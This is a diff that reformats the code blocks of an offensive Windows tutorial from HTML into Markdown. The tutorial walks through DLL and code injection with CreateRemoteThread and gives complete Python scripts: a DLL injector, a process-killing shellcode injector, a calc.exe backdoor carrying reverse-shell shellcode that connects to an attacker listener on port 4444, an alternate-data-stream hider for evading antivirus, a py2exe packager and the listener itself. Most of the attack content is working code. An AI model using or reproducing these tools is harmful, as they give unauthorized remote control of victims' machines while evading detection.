@@ -32,10 +32,8 @@ Both DLL injection and code injection rely on a single, powerful Windows API cal
 
 Here is the prototype:
 
-<div class="code-block-wrap">
-  <span class="code-block-label">CreateRemoteThread API</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>HANDLE WINAPI CreateRemoteThread(
+```bash
+HANDLE WINAPI CreateRemoteThread(
   HANDLE hProcess,
   LPSECURITY_ATTRIBUTES lpThreadAttributes,
   SIZE_T dwStackSize,
@@ -43,8 +41,8 @@ Here is the prototype:
   LPVOID lpParameter,
   DWORD dwCreationFlags,
   LPDWORD lpThreadId
-);</code></pre>
-</div>
+);
+```
 
 The key parameters are:
 - **hProcess**: A handle to the process we are injecting into.
@@ -65,10 +63,8 @@ The procedure is straightforward:
 
 Let's write a Python script to do this. Note that we'll need the `ctypes` library to interact with the Windows API.
 
-<div class="code-block-wrap">
-  <span class="code-block-label">dll_injector.py</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>import sys
+```python
+import sys
 from ctypes import *
 
 # Windows API Constants
@@ -79,7 +75,7 @@ PAGE_READWRITE = 0x04
 kernel32 = windll.kernel32
 
 if len(sys.argv) != 3:
-    print("[*] Usage: dll_injector.exe &lt;PID&gt; &lt;Path to DLL&gt;")
+    print("[*] Usage: dll_injector.exe <PID> <Path to DLL>")
     sys.exit(0)
 
 pid = int(sys.argv[1])
@@ -109,8 +105,8 @@ if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0
     print("[*] Failed to inject the DLL.")
     sys.exit(0)
 
-print("[*] Remote thread with ID 0x%08x created." % thread_id.value)</code></pre>
-</div>
+print("[*] Remote thread with ID 0x%08x created." % thread_id.value)
+```
 
 To test this, you can compile any DLL (e.g., a simple message box) and run `python dll_injector.py <PID> C:\path\to\evil.dll`. The target process will load your DLL and execute its `DllMain` routine.
 
@@ -120,10 +116,8 @@ Code injection moves a step further. Instead of loading a DLL from disk, we writ
 
 For this example, we'll use Metasploit's `cmd/windows/exec` payload to execute `taskkill /PID AAAAA`, which terminates a process. We will dynamically swap the `AAAAA` placeholder with a real PID.
 
-<div class="code-block-wrap">
-  <span class="code-block-label">code_injector.py</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>import sys
+```python
+import sys
 from ctypes import *
 
 PAGE_EXECUTE_READWRITE = 0x00000040
@@ -133,7 +127,7 @@ VIRTUAL_MEM = 0x1000 | 0x2000
 kernel32 = windll.kernel32
 
 if len(sys.argv) != 3:
-    print("[*] Usage: code_injector.exe &lt;PID to inject&gt; &lt;PID to kill&gt;")
+    print("[*] Usage: code_injector.exe <PID to inject> <PID to kill>")
     sys.exit(0)
 
 pid = int(sys.argv[1])
@@ -180,8 +174,8 @@ if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byr
     sys.exit(0)
 
 print("[*] Remote thread created with ID 0x%08x" % thread_id.value)
-print("[*] Process %s should not be running anymore!" % pid_to_kill)</code></pre>
-</div>
+print("[*] Process %s should not be running anymore!" % pid_to_kill)
+```
 
 Run this script with `python code_injector.py <TargetPID> <VictimPID>`. The target process will be injected, and a thread will be spawned that executes `taskkill /PID <VictimPID>`, instantly killing the victim process.
 
@@ -196,10 +190,8 @@ When the user runs `calc.exe`, the backdoor launches.
 
 This requires the `ctypes` structures for process creation. Here is the complete `backdoor.py` script:
 
-<div class="code-block-wrap">
-  <span class="code-block-label">backdoor.py</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>import sys
+```python
+import sys
 from ctypes import *
 
 # Windows API Constants
@@ -334,8 +326,8 @@ replace_string = "\x41" * 8
 process_killer_shellcode = process_killer_shellcode.replace(replace_string, replace_value)
 
 # Inject process-killing shellcode into our own backdoor process
-inject(our_pid, process_killer_shellcode)</code></pre>
-</div>
+inject(our_pid, process_killer_shellcode)
+```
 
 This script requires a `reverse shell` payload. I used `msfvenom` to generate a Python-formatted payload targeting `192.168.244.1` on port `4444` (ensure you modify this in the `connect_back_shellcode` variable to match your listener's IP).
 
@@ -345,13 +337,11 @@ In order to safely distribute an injectable DLL with our backdoor, we need a ste
 
 A stream is essentially a hidden file attached to a visible file. By using ADS, we can hide our DLL within the `backdoor.exe` itself, escaping normal file directory listings and many antivirus scans.
 
-<div class="code-block-wrap">
-  <span class="code-block-label">file_hider.py</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>import sys
+```python
+import sys
 
 if len(sys.argv) != 3:
-    print("[*] Usage: file_hider.py &lt;DLL_to_hide&gt; &lt;Target_EXE&gt;")
+    print("[*] Usage: file_hider.py <DLL_to_hide> <Target_EXE>")
     sys.exit(0)
 
 # Read in the DLL
@@ -365,8 +355,8 @@ print("[*] Filesize: %d" % len(dll_contents))
 # Syntax: target_file:stream_name
 fd = open("%s:%s" % (sys.argv[2], sys.argv[1]), "wb")
 fd.write(dll_contents)
-fd.close()</code></pre>
-</div>
+fd.close()
+```
 
 To use it: `python file_hider.py evil.dll backdoor.exe`. The DLL is now hidden inside `backdoor.exe`. To access it from the backdoor, we'd simply read from `backdoor.exe:evil.dll`.
 
@@ -376,18 +366,16 @@ A major challenge for Python backdoors is that the target machine might not have
 
 Create a `setup.py` file to compile your backdoor:
 
-<div class="code-block-wrap">
-  <span class="code-block-label">setup.py</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>from distutils.core import setup
+```python
+from distutils.core import setup
 import py2exe
 
 setup(
     console=['backdoor.py'],
     options={'py2exe': {'bundle_files': 1}},
     zipfile=None,
-)</code></pre>
-</div>
+)
+```
 
 `bundle_files: 1` and `zipfile=None` tell `py2exe` to embed the Python DLL and all dependencies directly into the resulting `.exe`, making it completely portable.
 
@@ -405,10 +393,8 @@ Run the compiler: `python setup.py py2exe`. The output will be in the `dist` dir
 
 Finally, we need a listener to receive the reverse shell connections. We'll write a simple Python socket server that accepts connections, reads incoming data, and sends commands.
 
-<div class="code-block-wrap">
-  <span class="code-block-label">backdoor_shell.py</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>import socket
+```python
+import socket
 import sys
 
 host = "0.0.0.0"  # Listen on all interfaces
@@ -447,8 +433,8 @@ while True:
         sys.exit(0)
     
     client.sendall(command + "\r\n")
-    print("[*] Sent => %s" % command)</code></pre>
-</div>
+    print("[*] Sent => %s" % command)
+```
 
 Start this script on your attacker machine: `python backdoor_shell.py`. When you execute `backdoor.exe` on the victim machine, the reverse shell will connect back to your port `4444`, granting you system-level access (as long as the target calculator process runs with sufficient privileges).
 
